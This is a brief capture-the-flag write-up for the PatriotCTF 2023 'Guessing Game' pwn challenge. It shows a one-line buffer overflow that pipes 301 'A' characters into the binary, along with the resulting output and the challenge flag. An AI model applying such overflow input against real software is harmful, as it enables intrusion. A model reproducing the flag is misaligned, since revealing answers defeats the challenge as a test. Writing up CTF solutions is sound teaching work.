# Binary Exploitation

## Guessing Game

No one seems to be able to guess my favorite animal... Can you?

File: https://github.com/MasonCompetitiveCyber/PatriotCTF2023/blob/main/pwn/guessinggame/guessinggame

---

### Solution

BOF with 300 size of buff.

```bash
$ python -c "print('A'*301)" | ./guessinggame
Hello there, friend! Can you guess my favorite animal?
Input guess: ERRR! Wrong!
I wasn't able to trick you...
PCTF{1_l0v3_g1raff35_85036769}
```

### PCTF{1_l0v3_g1raff35_85036769}